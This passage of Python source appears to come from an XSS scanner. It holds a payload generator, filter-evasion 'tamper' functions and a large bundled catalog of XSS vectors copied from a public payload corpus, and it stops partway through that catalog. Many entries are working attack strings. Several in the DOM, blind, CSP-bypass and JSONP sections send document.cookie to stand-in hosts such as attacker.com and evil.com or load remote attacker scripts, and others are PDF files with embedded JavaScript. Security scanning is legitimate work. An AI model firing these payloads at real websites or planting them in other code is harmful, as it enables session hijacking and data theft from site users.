        """Generate a DOM XSS payload."""
        template = f"<script>if(window.{source}){{window.__xoxss_dom.push('{marker}')}}</script>"
        return Payload(
            template=template,
            context=PayloadContext.HTML,
            marker=marker,
            description="DOM XSS payload"
        )

    def tamper_payload(
        self,
        payload: str,
        techniques: List[str]
    ) -> str:
        """
        Apply tampering techniques to a payload.

        Args:
            payload: Original payload
            techniques: List of tampering techniques to apply

        Returns:
            Tampered payload
        """
        result = payload

        for technique in techniques:
            if technique == "doubleencode":
                result = self._double_encode(result)
            elif technique == "uppercase":
                result = result.upper()
            elif technique == "hexencode":
                result = self._hex_encode(result)
            elif technique == "urlencode":
                result = self._url_encode(result)
            elif technique == "htmlentities":
                result = self._html_entities(result)
            elif technique == "jscomment":
                result = self._js_comment(result)
            elif technique == "spacetab":
                result = self._space_tab(result)
            elif technique == "jsonfuzz":
                result = self._json_fuzz(result)

        return result

    def _double_encode(self, payload: str) -> str:
        """Double URL encode the payload."""
        import urllib.parse
        return urllib.parse.quote(urllib.parse.quote(payload))

    def _hex_encode(self, payload: str) -> str:
        """Hex encode the payload."""
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    def _url_encode(self, payload: str) -> str:
        """URL encode the payload."""
        import urllib.parse
        return urllib.parse.quote(payload)

    def _html_entities(self, payload: str) -> str:
        """Convert to HTML entities."""
        return "".join(f"&#{ord(c)};" for c in payload)

    def _js_comment(self, payload: str) -> str:
        """Add JavaScript comments to break filters."""
        return payload.replace("<", "</*").replace(">", "*/>")

    def _space_tab(self, payload: str) -> str:
        """Replace spaces with tabs."""
        return payload.replace(" ", "\t")

    def _json_fuzz(self, payload: str) -> str:
        """Add JSON-specific characters."""
        return payload.replace(" ", "\u0000")

    def generate_random_marker(self, length: int = 12) -> str:
        """Generate a random unique marker."""
        return "".join(random.choices(string.ascii_letters + string.digits, k=length))


# ======================================================================================
# Bundled payload catalog (brokep/XSS-Payloads)
# ======================================================================================
# Every vector below is reproduced from the public brokep/XSS-Payloads corpus:
#
#   Reflected, stored, DOM, blind, self, mutation, polyglot, UXSS, attribute,
#   cookie, POST, JSON, WebSocket, indirect, iframe, PDF, SVG, Flash, AJAX,
#   CSP bypass, canonical, event handler, JSONP and XHR payload families.
#
# The catalog is data, not a wordlist: each entry keeps its original attack
# family and target contexts so the engine can schedule only vectors that are
# syntactically meaningful for the reflection it is probing.  ``auto`` marks
# vectors that fire without user interaction (the browser gate can confirm
# them); ``reference`` marks snippets that are documentation for a client,
# runtime or file format and are never injected as request parameters.

CATALOG_SOURCE = "https://github.com/brokep/XSS-Payloads"


class PayloadCategory(str, Enum):
    """Attack family from the XSS-Payloads corpus."""

    REFLECTED = "reflected"
    STORED = "stored"
    DOM = "dom"
    BLIND = "blind"
    SELF = "self"
    MUTATION = "mutation"
    POLYGLOT = "polyglot"
    UXSS = "uxss"
    ATTRIBUTE = "attribute"
    COOKIE = "cookie"
    POST = "post"
    JSON = "json"
    WEBSOCKET = "websocket"
    INDIRECT = "indirect"
    IFRAME = "iframe"
    PDF = "pdf"
    SVG = "svg"
    FLASH = "flash"
    AJAX = "ajax"
    CSP_BYPASS = "csp_bypass"
    CANONICAL = "canonical"
    EVENT_HANDLER = "event_handler"
    JSONP = "jsonp"
    XHR = "xhr"


@dataclass(frozen=True)
class _CategoryMeta:
    contexts: Tuple[str, ...]
    tags: Tuple[str, ...] = ()
    reference: bool = False


@dataclass(frozen=True)
class CatalogPayload:
    """One catalog vector with its scheduling metadata."""

    payload: str
    category: PayloadCategory
    contexts: Tuple[str, ...]
    tags: Tuple[str, ...] = ()
    auto: bool = True
    reference: bool = False
    source: str = CATALOG_SOURCE

    @property
    def injectable(self) -> bool:
        """True when the vector can be delivered through an injection point."""
        return not self.reference


_CATEGORY_META: Dict[PayloadCategory, _CategoryMeta] = {
    PayloadCategory.REFLECTED: _CategoryMeta(
        contexts=("html", "generic"),
        tags=(),
        reference=False,
    ),
    PayloadCategory.STORED: _CategoryMeta(
        contexts=("html", "generic"),
        tags=(),
        reference=False,
    ),
    PayloadCategory.DOM: _CategoryMeta(
        contexts=("html", "generic"),
        tags=(),
        reference=False,
    ),
    PayloadCategory.BLIND: _CategoryMeta(
        contexts=("html", "generic"),
        tags=("blind", "exfiltration"),
        reference=False,
    ),
    PayloadCategory.SELF: _CategoryMeta(
        contexts=("html", "generic"),
        tags=("self",),
        reference=False,
    ),
    PayloadCategory.MUTATION: _CategoryMeta(
        contexts=("html", "generic"),
        tags=("mutation", "filter-bypass"),
        reference=False,
    ),
    PayloadCategory.POLYGLOT: _CategoryMeta(
        contexts=("html", "attr_double", "attr_single", "attr_unquoted", "generic"),
        tags=("polyglot",),
        reference=False,
    ),
    PayloadCategory.UXSS: _CategoryMeta(
        contexts=("html", "generic"),
        tags=("uxss",),
        reference=False,
    ),
    PayloadCategory.ATTRIBUTE: _CategoryMeta(
        contexts=("html", "attr_double", "attr_single", "attr_unquoted", "generic"),
        tags=("attribute",),
        reference=False,
    ),
    PayloadCategory.COOKIE: _CategoryMeta(
        contexts=("html", "generic"),
        tags=("cookie", "exfiltration"),
        reference=False,
    ),
    PayloadCategory.POST: _CategoryMeta(
        contexts=("html", "generic"),
        tags=("form", "post"),
        reference=False,
    ),
    PayloadCategory.JSON: _CategoryMeta(
        contexts=("json", "generic"),
        tags=("json",),
        reference=False,
    ),
    PayloadCategory.WEBSOCKET: _CategoryMeta(
        contexts=("script", "generic"),
        tags=("websocket",),
        reference=True,
    ),
    PayloadCategory.INDIRECT: _CategoryMeta(
        contexts=("html", "generic"),
        tags=("indirect",),
        reference=False,
    ),
    PayloadCategory.IFRAME: _CategoryMeta(
        contexts=("html", "generic"),
        tags=("iframe",),
        reference=False,
    ),
    PayloadCategory.PDF: _CategoryMeta(
        contexts=("generic",),
        tags=("pdf",),
        reference=True,
    ),
    PayloadCategory.SVG: _CategoryMeta(
        contexts=("html", "generic"),
        tags=("svg",),
        reference=False,
    ),
    PayloadCategory.FLASH: _CategoryMeta(
        contexts=("html", "generic"),
        tags=("flash", "legacy"),
        reference=False,
    ),
    PayloadCategory.AJAX: _CategoryMeta(
        contexts=("script", "generic"),
        tags=("ajax",),
        reference=True,
    ),
    PayloadCategory.CSP_BYPASS: _CategoryMeta(
        contexts=("html", "script", "generic"),
        tags=("csp-bypass", "filter-bypass"),
        reference=False,
    ),
    PayloadCategory.CANONICAL: _CategoryMeta(
        contexts=("html", "generic"),
        tags=("canonical",),
        reference=False,
    ),
    PayloadCategory.EVENT_HANDLER: _CategoryMeta(
        contexts=("html", "attr_double", "attr_single", "attr_unquoted", "generic"),
        tags=("event-handler",),
        reference=False,
    ),
    PayloadCategory.JSONP: _CategoryMeta(
        contexts=("url", "script", "generic"),
        tags=("jsonp",),
        reference=False,
    ),
    PayloadCategory.XHR: _CategoryMeta(
        contexts=("script", "generic"),
        tags=("xhr",),
        reference=True,
    ),
}


_AUTO_EVENTS = frozenset({
    "load", "error", "start", "toggle", "begin", "focus", "blur",
    "animationstart", "animationend", "finish", "progress", "canplay",
    "cuechange", "play", "playing", "open", "show", "invalid",
})
_EVENT_ATTR_RE = re.compile(r"\bon(?P<event>[a-z]+)\s*=", re.IGNORECASE)
_AUTO_URL_RE = re.compile(
    r"<(?:iframe|object|embed|meta)\b[^>]*\b(?:src|data|content)\s*=\s*[\"']?[^>]*javascript:",
    re.IGNORECASE,
)


def _auto_executes(payload: str) -> bool:
    """Heuristic: does this vector fire without a user gesture?"""
    lowered = payload.lower()
    if "<script" in lowered:
        # An external script only executes if its host is reachable.
        return not re.search(r"<script[^>]*\bsrc\s*=\s*[\"']?(?:https?:)?//", lowered)
    if _AUTO_URL_RE.search(payload):
        return True
    for match in _EVENT_ATTR_RE.finditer(payload):
        if match.group("event").lower() in _AUTO_EVENTS:
            return True
    return False


_CATALOG_DATA: Dict[PayloadCategory, Tuple[str, ...]] = {
    PayloadCategory.REFLECTED: (
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        '<a href="javascript:alert(\'XSS\')">Click me</a>',
        "<svg onload=alert('XSS')>",
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        "<marquee onstart=alert('XSS')>XSS</marquee>",
        "<body onload=alert('XSS')>",
        '<input value="<script>alert(\'XSS\')</script>">',
        '<object data="javascript:alert(\'XSS\')"></object>',
        '<embed src="javascript:alert(\'XSS\')">',
        '"><script>alert(\'XSS\')</script>',
        '"><img src=x onerror=alert(\'XSS\')>',
        '"><svg onload=alert(\'XSS\')>',
        '"><iframe src="javascript:alert(\'XSS\')">',
        '"><body onload=alert(\'XSS\')>',
        '"><input value="<script>alert(\'XSS\')</script>">',
        '"><object data="javascript:alert(\'XSS\')">',
        '"><embed src="javascript:alert(\'XSS\')">',
        '"><a href="javascript:alert(\'XSS\')">Click me</a>',
        "</textarea><script>alert('XSS')</script>",
        "</style><script>alert('XSS')</script>",
        "</title><script>alert('XSS')</script>",
    ),
    PayloadCategory.STORED: (
        '<script>alert(1)</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload=alert(1)>',
        '<marquee onstart=alert(1)></marquee>',
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<a href="javascript:alert(1)">Click Me</a>',
        '<input value="XSS" onfocus="alert(1)">',
        '<details open ontoggle=alert(1)></details>',
        '<isindex prompt="XSS"><script>alert(1)</script>',
        '<embed src="javascript:alert(1)">',
        '<object data="javascript:alert(1)"></object>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<form><button formaction="javascript:alert(1)">Click</button></form>',
        '<audio src="x" onerror="alert(1)"></audio>',
        '<video src="x" onerror="alert(1)"></video>',
        '<command oncommand=alert(1)></command>',
        '<keygen onfocus=alert(1)></keygen>',
        '<progress value=1 max=2 onprogress=alert(1)></progress>',
        '<meter value=1 max=2 onmouseover=alert(1)></meter>',
    ),
    PayloadCategory.DOM: (
        "<script>document.location='https://attacker.com/?cookie='+document.cookie</script>",
        '<img src="x" onerror="document.location=\'https://attacker.com/?cookie=\'+document.cookie">',
        '<script>eval(\'document.location="https://attacker.com/?cookie="+document.cookie\')</script>',
        '<iframe src="javascript:alert(document.domain)"></iframe>',
        '<a href="javascript:alert(document.domain)">Click me</a>',
        '<svg onload="document.location=\'https://attacker.com/?cookie=\'+document.cookie"></svg>',
        "<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>",
        '<input value="<img src=\'x\' onerror=\'alert(1)\'>">',
        '<svg><script>alert(1)</script></svg>',
        '<img src="x" onerror="alert(\'DOM XSS\')">',
    ),
    PayloadCategory.BLIND: (
        '<script src="https://attacker.com/xss.js"></script>',
        '<img src="x" onerror="fetch(\'https://attacker.com?c=\'+document.cookie)">',
        '<svg onload="fetch(\'https://attacker.com?d=\'+document.domain)"></svg>',
        '<body onload="fetch(\'https://attacker.com?l=\'+location)">',
        '<input value="<img src=x onerror=alert(1)>">',
        '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<a href="javascript:alert(1)">Click me</a>',
        '<svg><script>alert(1)</script></svg>',
        '<svg onload=alert(document.cookie)></svg>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        '<script>alert(1)</script>',
        '<details open ontoggle=alert(1)></details>',
        '<div onpointerenter=alert(1)>Hover me</div>',
        '<button onclick="alert(1)">Click</button>',
        '"><img src=x onerror=alert(1)>',
        '<marquee onstart=alert(1)>XSS</marquee>',
        '<a href="javascript:alert(document.cookie)">Click</a>',
        '<svg><g onload=alert(1)></g></svg>',
        '<x onmouseover=alert(1)>Hover</x>',
        '<iframe src=javascript:alert(1)></iframe>',
        '<svg onload=alert(1)></svg>',
        "<script>alert('XSS')</script>",
        '"><script>alert(document.cookie)</script>',
        '<x onmouseover=alert(document.domain)>Hover</x>',
        '<img src=x onerror=alert(location)>',
        '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>',
        "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>",
        "<script>fetch('https://attacker.com?d='+document.domain)</script>",
        '<iframe src="https://attacker.com?c="+document.cookie></iframe>',
        "<body onload=fetch('https://attacker.com?l='+location)></body>",
        '"><img src=x onerror=alert(\'XSS\')>',
    ),
    PayloadCategory.SELF: (
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(\'XSS\')>',
        '"><svg onload=alert(\'XSS\')>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><body onload=alert(\'XSS\')>',
        '"><input value="<svg onload=alert(1)>">',
        '"><textarea><svg onload=alert(\'XSS\')></textarea>',
        '"><iframe src=javascript:alert(\'XSS\')>',
        '"><math><mtext></mtext><script>alert(\'XSS\')</script></math>',
        '"><marquee onstart=alert(\'XSS\')>XSS</marquee>',
    ),
    PayloadCategory.MUTATION: (
        '<IMG SRC="javascript:alert(\'XSS\')">',
        '<IMG SRC=`javascript:alert("XSS")`>',
        '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
        "<IMG SRC=javascript:alert('XSS')>",
        '"><IMG SRC=javascript:alert(\'XSS\')>',
        '<IMG SRC="jav\tascript:alert(\'XSS\');">',
        '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
        '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
        '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
        '<IMG SRC="jav&#x0D;ascript:alert(document.domain)">',
        '<IMG SRC="javascript:alert`1`">',
        '<IMG SRC="javascript:confirm`1`">',
        '<IMG SRC="javascript:prompt`1`">',
        '<IMG SRC=javascript:alert(document.cookie)>',
        '<IMG SRC=javascript:alert(1)//>',
        '<IMG SRC=javascript:alert(1)<!-->',
        '<IMG SRC=javascript:alert(1)>>',
        '<IMG SRC="javascript:alert(1)">',
        '<IMG SRC=javascript:alert(1)>',
    ),
    PayloadCategory.POLYGLOT: (
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '"><svg onload=alert(1)>',
        '"><body onload=alert(1)>',
        '"><iframe src=javascript:alert(1)>',
        '";alert(1)//',
        '</title><script>alert(1)</script>',
        '"><a href=javascript:alert(1)>Click me</a>',
        '"><details open ontoggle=alert(1)>',
        '"><marquee onstart=alert(1)>XSS</marquee>',
    ),
    PayloadCategory.UXSS: (
        '<iframe src="javascript:alert(\'UXSS\')"></iframe>',
        '<object data="javascript:alert(\'UXSS\')"></object>',
        '<embed src="javascript:alert(\'UXSS\')"></embed>',
        "<svg><script>alert('UXSS')</script></svg>",
        "<svg onload=alert('UXSS')></svg>",
        '<iframe src="data:text/html,<svg onload=alert(\'UXSS\')>"></iframe>',
        '<svg><a href="javascript:alert(\'UXSS\')">CLICK</a></svg>',
        '<iframe src="javascript:alert(\'UXSS\')" onload=alert(\'UXSS\')></iframe>',
        '<script>window.open(\'javascript:alert("UXSS")\')</script>',
        '<img src=x onerror="window.open(\'javascript:alert(1)\')">',
    ),
    PayloadCategory.ATTRIBUTE: (
        '<img src=x onerror=alert(1)>',
        '<img src=x onerror="alert(\'XSS\')">',
        "<div onmouseover=alert('XSS')>Hover me!</div>",
        '<a href="javascript:alert(1)">Click me</a>',
        '<input type="text" value="XSS" onfocus="alert(1)">',
        '<body onload="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')"></svg>',
        '<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>',
        "<audio src onerror=alert('XSS')></audio>",
        '<iframe src="javascript:alert(1)"></iframe>',
    ),
    PayloadCategory.COOKIE: (
        '<script>document.cookie="xss=1";</script>',
        '<script>alert(document.cookie)</script>',
        '<img src=x onerror="alert(document.cookie)">',
        '<iframe src="javascript:alert(document.cookie)"></iframe>',
        '<svg onload="alert(document.cookie)"></svg>',
        '<video poster=1 onerror="alert(document.cookie)"></video>',
        '<body onload="alert(document.cookie)">',
        '<object data="javascript:alert(document.cookie)"></object>',
        '<embed src="javascript:alert(document.cookie)">',
        '<a href="javascript:alert(document.cookie)">Click me</a>',
    ),
    PayloadCategory.POST: (
        '<input type="text" value="<script>alert(\'XSS\')</script>">',
        "<textarea><script>alert('XSS')</script></textarea>",
        '<form><button formaction="javascript:alert(\'XSS\')">Click me</button></form>',
        '<form><input type="hidden" name="xss" value="<script>alert(\'XSS\')</script>"></form>',
        '<input type="text" onfocus="alert(\'XSS\')" value="Focus me">',
        '<input type="button" value="Click me" onclick="alert(\'XSS\')">',
        '<form action="https://example.com/post" method="POST"><input type="text" value="<script>alert(\'XSS\')</script>"></form>',
        '<input type="text" value=\'"><script>alert(1)</script>\'>',
        '<input type="text" value=\'"><img src=x onerror=alert(1)>\'>',
        '<form><input name="xss" value="<img src=x onerror=alert(\'XSS\')>"></form>',
    ),
    PayloadCategory.JSON: (
        '{"payload":"<script>alert(1)</script>"}',
        '{"user":"<img src=x onerror=alert(1)>"}',
        '{"data":"<svg onload=alert(1)>"}',
        '{"info":"<iframe src=javascript:alert(1)>"}',
        '{"test":"<object data=javascript:alert(1)>"}',
        '{"input":"<a href=javascript:alert(1)>Click</a>"}',
        '{"xss":"<video><source onerror=alert(1)>"}',
        '{"alert":"<marquee onstart=alert(1)>"}',
        '{"hacker":"<details ontoggle=alert(1)>"}',
        '{"exploit":"<img src=1 onerror=\'alert(document.domain)\'>"}',
        '{"attack":"<link rel=stylesheet href=javascript:alert(1)>"}',
        '{"vuln":"<style>@import\'javascript:alert(1)\';</style>"}',
        '{"event":"<img src=x:alert(1) onerror=eval(src)>"}',
        '{"payload":"<img src="#" onerror=alert(\'XSS\')>"}',
        '{"vector":"<svg><script>alert(\'XSS\')</script></svg>"}',
        '{"exploit":"<img src=1 href=1 onerror=alert(\'XSS\')>"}',
        '{"alert":"<a href=javascript:alert(\'XSS\')>Click me</a>"}',
        '{"attack":"<iframe src=javascript:alert(\'XSS\')>"}',
        '{"trigger":"<img src onerror=alert(\'XSS\')>"}',
        '{"bypass":"<svg onload=alert(\'XSS\')>"}',
        '{"vulnerability":"<object data=javascript:alert(\'XSS\')>"}',
        '{"malicious":"<video><source onerror=alert(\'XSS\')>"}',
        '{"xss_test":"<a href=\'javascript:alert("XSS")\'>Click here</a>"}',
        '{"exploit_test":"<details ontoggle=alert(\'XSS\')>"}',
        '{"script_test":"<marquee onstart=alert(\'XSS\')>"}',
        '{"payload_300":"<img src=1 onerror=\'alert(document.domain)\'>"}',
        '{"danger":"<img src=x onerror=\'this.src=\\"https://evil.com/xss\\"\'>"}',
    ),
    PayloadCategory.WEBSOCKET: (
        """ws = new WebSocket('ws://victim.com/socket');
ws.onopen = function() {
    ws.send("<script>alert('XSS')</script>");
};""",
        """ws = new WebSocket('ws://victim.com/socket');
ws.onmessage = function(event) {
    eval(event.data); // Potential XSS if data is unsanitized
};""",
        'ws.send("{"key":"<img src=x onerror=alert(\'XSS\')>"});',
        'ws.send("{"payload":"<svg/onload=alert(\'XSS\')>"});',
        'ws.send("{"data":"<iframe src=javascript:alert(\'XSS\')></iframe>"});',
    ),
    PayloadCategory.INDIRECT: (
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '<img src="http://attacker.com/evil.png" onerror="alert(\'XSS\')">',
        '<input value="" onfocus="alert(\'XSS\')">',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        "<svg><script>alert('XSS')</script></svg>",
        '<body onload="alert(\'XSS\')"></body>',
        '<object data="javascript:alert(\'XSS\')"></object>',
        '<details open ontoggle="alert(\'XSS\')"></details>',
        '<marquee onstart="alert(\'XSS\')">XSS Test</marquee>',
        '<video src onerror="alert(\'XSS\')"></video>',
    ),
    PayloadCategory.IFRAME: (
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<iframe srcdoc="<script>alert(\'XSS\')</script>"></iframe>',
        '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="> </iframe>',
        '<iframe src="//evil.com/xss.html"></iframe>',
        '<iframe src="javascript:document.write(\'<img src=x onerror=alert(1)>\')"></iframe>',
        '<iframe src="javascript:parent.location=\'javascript:alert(1)\'"> </iframe>',
        '<iframe src="http://victim.com" onload="alert(\'XSS\')"></iframe>',
        '<iframe src="about:blank" onload="this.contentWindow.document.write(\'<img src=x onerror=alert(1)>\')"></iframe>',
        '<iframe src="javascript:alert(document.cookie)"></iframe>',
        '<iframe srcdoc="<svg/onload=alert(\'XSS\')>"></iframe>',
    ),
    PayloadCategory.PDF: (
        """%PDF-1.5
1 0 obj
<< /OpenAction 2 0 R >>
endobj
2 0 obj
<< /S /JavaScript /JS (alert('XSS')) >>
endobj
xref
0 3
0000000000 65535 f 
0000000010 00000 n 
0000000079 00000 n 
trailer
<< /Root 1 0 R >>
startxref
118
%%EOF""",
        """%PDF-1.4
1 0 obj
<< /Type /Catalog /OpenAction 2 0 R >>
endobj
2 0 obj
<< /S /JavaScript /JS (alert('PDF XSS')) >>
endobj
xref
0 3
0000000000 65535 f 
0000000010 00000 n 
0000000079 00000 n 
trailer
<< /Root 1 0 R >>
startxref
118
%%EOF""",
        """%PDF-1.3
1 0 obj
<< /Type /Catalog /OpenAction 2 0 R >>
endobj
2 0 obj
<< /S /JavaScript /JS (alert(document.cookie)) >>
endobj
xref
0 3
0000000000 65535 f 
0000000010 00000 n 
0000000079 00000 n 
trailer
<< /Root 1 0 R >>
startxref
118
%%EOF""",
    ),
    PayloadCategory.SVG: (
        """<svg xmlns="http://www.w3.org/2000/svg">
<script>alert('XSS')</script>
</svg>""",
        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'XSS\')"></svg>',
        '<svg><g onload="alert(\'XSS\')"></g></svg>',
        '<svg><a xlink:href="javascript:alert(\'XSS\')">Click me</a></svg>',
        """<svg xmlns="http://www.w3.org/2000/svg">
  <animate attributeName="x" from="0" to="1" onbegin="alert('XSS')"></animate>
</svg>""",
        """<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert('XSS')</script>
    </body>
  </foreignObject>
</svg>""",
    ),
    PayloadCategory.FLASH: (
        '<embed src="http://vulnerable.com/xss.swf?alert(\'XSS\')">',
        '<object data="http://vulnerable.com/xss.swf?alert(\'XSS\')"></object>',
        """<object type="application/x-shockwave-flash" data="http://vulnerable.com/xss.swf">
  <param name="movie" value="http://vulnerable.com/xss.swf?alert('XSS')">
</object>""",
        '<embed src="data:application/x-shockwave-flash;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="/>',
        '<object data="data:application/x-shockwave-flash;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=" type="application/x-shockwave-flash"></object>',
    ),
    PayloadCategory.AJAX: (
        '$.get("/vulnerable", {data: "<script>alert(\'XSS\')</script>"});',
        '$.post("/vulnerable", {data: "<img src=\'x\' onerror=\'alert(1)\'>"});',
        "fetch('/vulnerable?data=<script>alert(1)</script>');",
        """var xhr = new XMLHttpRequest();
xhr.open("GET", "/vulnerable?data=<svg onload=alert('XSS')>");
xhr.send();""",
        """jQuery.ajax({
  url: '/vulnerable',
  data: { input: '<script>alert(1)</script>' }
});""",
    ),
    PayloadCategory.CSP_BYPASS: (
        '<script src="//evil.com/xss.js"></script>',
        "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
        "<script>eval('alert(1)')</script>",
        '<script src=data:application/javascript;base64,YWxlcnQoMSk=></script>',
        "<script>window['ale'+'rt'](1)</script>",
        "<img src=x onerror=eval('ale'+'rt(1)')>",
        "<script>setTimeout('alert(1)',0)</script>",
        '<svg><script>alert`1`</script></svg>',
        '<a href="javascript:alert(1)">Click me</a>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    ),
    PayloadCategory.CANONICAL: (
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg><script>alert(1)</script></svg>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        "<body onload=alert('XSS')>",
        '<video><source onerror="alert(\'XSS\')"></video>',
        '<object data="javascript:alert(\'XSS\')"></object>',
        '<a href="javascript:alert(1)">Click me</a>',
        "<marquee onstart=alert('XSS')></marquee>",
        '<div style="animation-name:rotation" onanimationstart="alert(\'XSS\')"></div>',
    ),
    PayloadCategory.EVENT_HANDLER: (
        '<button onclick="alert(\'XSS\')">Click Me</button>',
        '<img src=x onerror=alert(1)>',
        "<body onload=alert('XSS')>",
        "<marquee onstart=alert('XSS')></marquee>",
        '<div onmouseover="alert(\'XSS\')">Hover me</div>',
        '<input type="text" value="Test" onfocus="alert(\'XSS\')">',
        '<a href="#" onmousedown="alert(\'XSS\')">Down</a>',
        '<form action="#" onsubmit="alert(\'XSS\')">',
        '<video><source onerror="alert(\'XSS\')"></video>',
        '<object data="javascript:alert(\'XSS\')"></object>',
    ),
    PayloadCategory.JSONP: (
        '<script src="https://example.com/jsonp?callback=alert(1)"></script>',
        '<script src="https://example.com/api?callback=console.log&data=<img src=x onerror=alert(1)>"></script>',
        '<script src="https://example.com/?jsonp=alert(document.cookie)"></script>',
        "<script>$.getScript('https://example.com/callback?data=<svg onload=alert(1)>')</script>",
        '<script src="https://example.com/jsonp?callback=alert&data=<img src=x onerror=alert(\'XSS\')>"></script>',
        '<script src="https://example.com/api?cb=alert(\'XSS\')"></script>',
        '<script src="https://example.com/api?callback=alert&xss=<script>alert(1)<\\/script>"></script>',
        '<script src="https://example.com/jsonp?callback=fetch(\'https://attacker.com/?cookie=\'+document.cookie)"></script>',
        '<script src="https://example.com/?callback=alert(document.domain)"></script>',
        '<script src="https://example.com/api?jsonp=alert(1)"></script>',
    ),
    PayloadCategory.XHR: (
        """<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://example.com/api?data=<img src=x onerror=alert(1)>', true);
  xhr.send();
</script>""",
        """<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://example.com/login', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('username=admin&password=<script>alert(1)</script>');
</script>""",
        """<script>
  fetch('https://example.com/api?data=<svg onload=alert(1)>')
    .then(response => response.text())
    .then(data => document.write(data));
</script>""",
        """<script>
  $.get('https://example.com/api?data=<img src=x onerror=alert(1)>');
</script>""",
        '<script>\n  var xhr = new XMLHttpRequest();\n  xhr.open(\'GET\', \'https://example.com/api?data=\'+encodeURIComponent("<script>alert(\'XSS\')<\\/script>"), true);\n  xhr.send();\n</script>',
        """<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '/search?q=<img src=x onerror=alert(1)>', true);
  xhr.send();
</script>""",
        """<script>
  fetch('/api?callback=alert(1)')
    .then(response => response.text())
    .then(eval);
</script>""",
        """<script>
  $.ajax({
    url: 'https://example.com/api?data=<script>alert(1)</script>',
    success: function(data) {
      document.write(data);
    }
  });
</script>""",
        """<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://example.com/api?query=<img src=x onerror=alert(1)>', true);
  xhr.send();
</script>""",
        """<script>
  $.getJSON('https://example.com/api?callback=alert&data=<img src=x onerror=alert(1)>');
</script>""",
    ),
}


# ======================================================================================
# README inline examples (brokep/XSS-Payloads)
# ======================================================================================
# The README documents one example vector per feature; the .txt corpora above are the
# bulk lists.  These entries are merged into the catalog so the documented examples are
# testable too, and per-category duplicates are dropped at build time.

_README_DATA: Dict[PayloadCategory, Tuple[str, ...]] = {
    PayloadCategory.REFLECTED: (
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        '<input value="" onfocus="alert(\'XSS\')">',
        '<div onmouseover="alert(\'XSS\')">Hover me</div>',
        '<img src=1 onerror=\'alert("XSS")\'>',
        "<svg><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        '" onfocus="alert(\'XSS\')" autofocus',
        "'><img src=x onerror=alert('XSS')>",
    ),
    PayloadCategory.STORED: (
        "<script>alert('Stored XSS')</script>",
        "<img src=x onerror=alert('Stored XSS')>",
        "<svg onload=alert('Stored XSS')>",
        '<iframe src="javascript:alert(\'Stored XSS\')"></iframe>',
        "<body onload=alert('Stored XSS')>",
        '<link rel="stylesheet" href="javascript:alert(\'Stored XSS\')">',
        '<a href="javascript:alert(\'Stored XSS\')">Click me</a>',
        '<input value="" onfocus="alert(\'Stored XSS\')">',
        '<div onmouseover="alert(\'Stored XSS\')">Hover me</div>',
        '<marquee onstart="alert(\'Stored XSS\')">Scroll me</marquee>',
        '"><img src=x onerror=alert(\'Stored XSS\')>',
        '"><svg onload=alert(\'Stored XSS\')>',
        '<img src=1 onerror=\'alert("Stored XSS")\'>',
        "<svg><script>alert('Stored XSS')</script>",
        "javascript:alert('Stored XSS')",
        '" onfocus="alert(\'Stored XSS\')" autofocus',
        "'><img src=x onerror=alert('Stored XSS')>",
    ),
    PayloadCategory.DOM: (
        "#<script>alert('DOM XSS')</script>",
        "#<img src=x onerror=alert('DOM XSS')>",
        "#<svg onload=alert('DOM XSS')>",
        '#<iframe src="javascript:alert(\'DOM XSS\')"></iframe>',
        "#<body onload=alert('DOM XSS')>",
        '#<link rel="stylesheet" href="javascript:alert(\'DOM XSS\')">',
        '#<a href="javascript:alert(\'DOM XSS\')">Click me</a>',
        '#<input value="" onfocus="alert(\'DOM XSS\')">',
        '#<div onmouseover="alert(\'DOM XSS\')">Hover me</div>',
        '#<marquee onstart="alert(\'DOM XSS\')">Scroll me</marquee>',
        '#"><img src=x onerror=alert(\'DOM XSS\')>',
        '#"><svg onload=alert(\'DOM XSS\')>',
        '#<img src=1 onerror=\'alert("DOM XSS")\'>',
